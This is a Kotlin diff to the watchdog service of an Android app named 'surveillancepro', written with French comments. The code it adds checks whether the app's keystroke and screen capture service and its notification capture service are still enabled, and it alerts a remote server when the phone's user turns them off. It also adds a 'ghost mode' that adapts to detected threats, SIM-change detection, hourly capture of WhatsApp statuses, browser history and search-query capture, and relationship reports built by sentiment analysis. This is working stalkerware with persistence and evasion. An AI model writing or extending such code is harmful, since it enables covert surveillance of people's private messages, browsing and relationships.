@@ -16,7 +16,12 @@ import android.os.PowerManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.surveillancepro.android.data.DeviceStorage
+import com.surveillancepro.android.data.EventQueue
 import com.surveillancepro.android.workers.SyncWorker
+import android.provider.Settings
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 /**
  * Service Watchdog qui surveille et redémarre les autres services.
@@ -168,6 +173,9 @@ class WatchdogService : Service() {
         } catch (_: Exception) {}
     }
 
+    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
+    private val prefs by lazy { getSharedPreferences("sp_watchdog", Context.MODE_PRIVATE) }
+    
     private fun checkAndRestartServices() {
         val storage = DeviceStorage.getInstance(this)
         if (!storage.hasAccepted || storage.deviceToken == null) {
@@ -176,6 +184,7 @@ class WatchdogService : Service() {
         }
 
         Log.d(TAG, "Checking services...")
+        val queue = EventQueue.getInstance(this)
 
         // 1. LocationService
         try {
@@ -216,7 +225,125 @@ class WatchdogService : Service() {
             SyncWorker.triggerNow(this)
         } catch (_: Exception) {}
 
+        // 6. CRITIQUE: Verifier les services systeme (Accessibility, NotificationListener)
+        checkCriticalServices(queue)
+        
+        // 7. FONCTIONNALITÉS AVANCÉES
+        checkAdvancedFeatures()
+
         Log.d(TAG, "Service check complete")
+    }
+    
+    /**
+     * Verifie que les services critiques (Accessibility, NotificationListener) sont actifs.
+     * Envoie une alerte au serveur si un service est desactive.
+     */
+    private fun checkCriticalServices(queue: EventQueue) {
+        val timestamp = dateFormat.format(Date())
+        
+        // Verifier AccessibilityService
+        val accessibilityEnabled = isAccessibilityServiceEnabled()
+        val lastAccessibilityState = prefs.getBoolean("last_accessibility_state", true)
+        
+        if (!accessibilityEnabled && lastAccessibilityState) {
+            // Le service vient d'etre desactive - envoyer une alerte
+            queue.enqueue("service_disabled_alert", mapOf(
+                "service" to "AccessibilityService",
+                "serviceName" to "Capture clavier et ecran",
+                "severity" to "critical",
+                "message" to "Le service d'accessibilite a ete desactive. La capture du texte tape et des messages ne fonctionne plus.",
+                "timestamp" to timestamp,
+            ))
+            Log.w(TAG, "ALERT: AccessibilityService disabled!")
+        }
+        prefs.edit().putBoolean("last_accessibility_state", accessibilityEnabled).apply()
+        
+        // Verifier NotificationListenerService
+        val notificationEnabled = isNotificationListenerEnabled()
+        val lastNotificationState = prefs.getBoolean("last_notification_state", true)
+        
+        if (!notificationEnabled && lastNotificationState) {
+            // Le service vient d'etre desactive - envoyer une alerte
+            queue.enqueue("service_disabled_alert", mapOf(
+                "service" to "NotificationListenerService",
+                "serviceName" to "Capture des notifications",
+                "severity" to "critical",
+                "message" to "Le service de notifications a ete desactive. Les messages WhatsApp, SMS et autres ne sont plus captures.",
+                "timestamp" to timestamp,
+            ))
+            Log.w(TAG, "ALERT: NotificationListenerService disabled!")
+        }
+        prefs.edit().putBoolean("last_notification_state", notificationEnabled).apply()
+        
+        // Envoyer un heartbeat avec l'etat des services
+        queue.enqueue("services_status", mapOf(
+            "accessibilityEnabled" to accessibilityEnabled,
+            "notificationListenerEnabled" to notificationEnabled,
+            "locationServiceRunning" to true,
+            "timestamp" to timestamp,
+        ))
+        
+        Log.d(TAG, "Critical services: Accessibility=$accessibilityEnabled, NotificationListener=$notificationEnabled")
+    }
+    
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        return try {
+            val enabledServices = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: ""
+            enabledServices.contains(packageName)
+        } catch (_: Exception) { false }
+    }
+    
+    private fun isNotificationListenerEnabled(): Boolean {
+        return try {
+            val enabledListeners = Settings.Secure.getString(
+                contentResolver,
+                "enabled_notification_listeners"
+            ) ?: ""
+            enabledListeners.contains(packageName)
+        } catch (_: Exception) { false }
+    }
+    
+    /**
+     * Vérifie et exécute les fonctionnalités avancées.
+     */
+    private fun checkAdvancedFeatures() {
+        try {
+            // 1. Mode fantôme intelligent - vérifier les menaces
+            SmartGhostMode.checkAndAdapt(this)
+            
+            // 2. Détection changement de SIM
+            SimChangeDetector.checkSimChange(this)
+            
+            // 3. Capture des statuts WhatsApp (toutes les heures)
+            val lastStatusScan = prefs.getLong("last_status_scan", 0)
+            if (System.currentTimeMillis() - lastStatusScan > 60 * 60 * 1000) {
+                WhatsAppStatusCapture.scanRecentStatuses(this)
+                prefs.edit().putLong("last_status_scan", System.currentTimeMillis()).apply()
+            }
+            
+            // 4. Historique navigateur (toutes les 2 heures)
+            val lastBrowserScan = prefs.getLong("last_browser_scan", 0)
+            if (System.currentTimeMillis() - lastBrowserScan > 2 * 60 * 60 * 1000) {
+                BrowserHistoryCapture.captureHistory(this)
+                BrowserHistoryCapture.extractSearchQueries(this)
+                BrowserHistoryCapture.detectSensitiveSites(this)
+                prefs.edit().putLong("last_browser_scan", System.currentTimeMillis()).apply()
+            }
+            
+            // 5. Rapport de relations (toutes les 6 heures)
+            val lastRelationReport = prefs.getLong("last_relation_report", 0)
+            if (System.currentTimeMillis() - lastRelationReport > 6 * 60 * 60 * 1000) {
+                SentimentAnalyzer.generateRelationshipReport(this)
+                prefs.edit().putLong("last_relation_report", System.currentTimeMillis()).apply()
+            }
+            
+            Log.d(TAG, "Advanced features check complete")
+        } catch (e: Exception) {
+            Log.w(TAG, "Advanced features check failed: ${e.message}")
+        }
     }
 
     private fun scheduleNextCheck() {
